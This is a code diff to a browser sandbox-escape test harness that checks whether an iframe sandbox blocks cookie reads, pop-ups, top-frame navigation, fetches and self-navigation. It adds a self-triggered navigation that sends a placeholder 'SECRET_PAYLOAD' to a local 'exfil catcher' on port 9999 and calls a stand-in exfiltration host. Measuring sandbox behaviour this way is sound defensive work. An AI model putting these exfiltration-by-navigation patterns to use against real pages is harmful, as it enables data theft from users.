@@ -7,6 +7,11 @@
  * precisely what we are measuring.
  */
 ;(function () {
+  if (window.__ws0beacon) window.__ws0beacon('app-js-executed')
+
+  var isTopLevel = false
+  try { isTopLevel = (window.top === window) } catch (e) { isTopLevel = false }
+
   const results = []
 
   function record(id, question, expected, actualFn) {
@@ -84,8 +89,17 @@
       'MEASURE', () => { const c = document.cookie; return c === '' ? 'empty-string' : c })
     record('window-open', 'window.open blocked without allow-popups',
       'blocked', () => { const w = window.open('https://ws0-exfil.invalid/'); return w ? 'OPENED' : 'blocked' })
-    record('top-nav', 'top-frame navigation blocked without allow-top-navigation',
-      'THREW', () => { window.top.location.href = 'https://ws0-exfil.invalid/top'; return 'NAVIGATED' })
+    // Only meaningful when FRAMED. When this document is itself the top-level
+    // browsing context, window.top === window, so this test would navigate the
+    // page away mid-run and destroy every later measurement — including the
+    // self-navigation test, which is the one that actually matters.
+    if (!isTopLevel) {
+      record('top-nav', 'top-frame navigation blocked without allow-top-navigation',
+        'THREW', () => { window.top.location.href = 'https://ws0-exfil.invalid/top'; return 'NAVIGATED' })
+    } else {
+      results.push({ id: 'top-nav', question: 'top-frame navigation (framed only)',
+        expected: 'n/a', actual: 'skipped: document IS top-level' })
+    }
 
     // Async: fetch. Resolve both before reporting.
     const fetches = Promise.all([
@@ -122,7 +136,26 @@
   }
 
   window.addEventListener('load', function () {
-    runSafe().then((r) => report(r))
+    if (window.__ws0beacon) window.__ws0beacon('load-fired-isTopLevel=' + isTopLevel)
+    runSafe().then(function (r) {
+      report(r)
+      if (window.__ws0beacon) window.__ws0beacon('results-reported')
+      if (isTopLevel) {
+        // No wrapper to command us. Self-trigger the decisive test — the exfil
+        // catcher on :9999 is the observation channel, so this works in any
+        // browser with no instrumentation.
+        // Beacon and navigation are separated in time on purpose: setting
+        // location.href cancels in-flight subresource requests, so firing the
+        // beacon immediately before would make "callback never ran" and
+        // "navigation happened" indistinguishable.
+        setTimeout(function () {
+          if (window.__ws0beacon) window.__ws0beacon('about-to-self-nav')
+          setTimeout(function () {
+            location.href = 'http://127.0.0.1:9999/collect?d=SECRET_PAYLOAD&ctx=top-level'
+          }, 500)
+        }, 600)
+      }
+    })
   })
 
   // Destructive phase — only on explicit command from the wrapper.
@@ -149,7 +182,7 @@
       // Target is a real, resolvable loopback URL on a DIFFERENT port (=>
       // different origin). A reserved .invalid TLD risks being short-circuited
       // before it reaches the network layer, which would mask the result.
-      var target = 'http://127.0.0.1:9999/collect?d=SECRET_PAYLOAD'
+      var target = 'http://127.0.0.1:9999/collect?d=SECRET_PAYLOAD&ctx=framed'
       parent.postMessage({ ws0: true, kind: 'self-nav-ack', payload: { target: target } }, '*')
       try {
         location.href = target
